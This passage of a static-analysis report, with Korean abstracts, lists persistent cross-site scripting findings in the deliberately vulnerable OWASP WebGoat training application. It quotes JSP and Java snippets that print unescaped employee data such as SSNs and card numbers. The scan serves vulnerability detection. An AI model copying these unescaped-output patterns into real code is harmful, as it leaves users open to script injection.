<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6FA5868E73E5294033FE42CF2B9268B5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 51 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>51</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="70B31400E6693D59423C875AD42CD596" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3C25FA84E96538228C33CAD82AD728F9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4BEC23945AE0F1462E50937B6FC56056" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BFC40FBA3F9B73C3A8654B3F76C62244" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 makeCurrent() 메서드가 245 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>245</LineStart>
<Snippet>			if ( ( results != null ) &amp;&amp; results.first() )
			{
				ec.addElement( new H1( "Message Contents For: " + results.getString( TITLE_COL )) );
				Table t = new Table( 0 ).setCellSpacing( 0 ).setCellPadding( 0 ).setBorder( 0 );
				TR row1 = new TR( new TD( new B(new StringElement( "Title:" )) ) );</Snippet>
<TargetFunction>org.apache.ecs.html.H1.H1()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>241</LineStart>
<Snippet>			statement.setString(1, getNameroot( s.getUserName() ) + "%");
			statement.setInt(2, messageNum);
			ResultSet results = statement.executeQuery();

			if ( ( results != null ) &amp;&amp; results.first() )</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EA87A4D3F4D7FA723DAF0F9D8662DA07" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="91E8207306858FFCD564BDF667685FE6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CD1072A90201B609B127FAA1EFF96442" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="06149EF0B7943F59B145A565C0786E37" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D8CC23B527BBD92422206E51A4A5B0CE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="37061C0D857C1BE1C523F391D6A8B535" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="70E77642D867C1D265D3D3D8D480B391" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="87C4663F7DF31DE7027FE5563DE691F0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A8F74CFD28D64743EDB07A053AC440CA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5A12D6878B9CDA55D2EE4F3751E5EDDE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5386AE346FEE8D0F9F317077BEDC5A34" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="18DA56795BBD8EAF944217BAF33AF72E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C17D91286AD2D02369C262900E561D07" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 concept1() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>126</LineStart>
<Snippet>		    tr = new TR();
		    tr.addElement(new TD(rs.getString("userid")));
		    tr.addElement(new TD(rs.getString("password")));
		    tr.addElement(new TD(rs.getString("ssn")));
		    tr.addElement(new TD(rs.getString("salary")));</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>113</LineStart>
<Snippet>		}

		ResultSet rs = statement.executeQuery(arrSQL[0]);
		if (rs.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="091A8FE9112D281AF646D8728B41718C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BB680607FA17E1FBEB294008FDD1E67E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
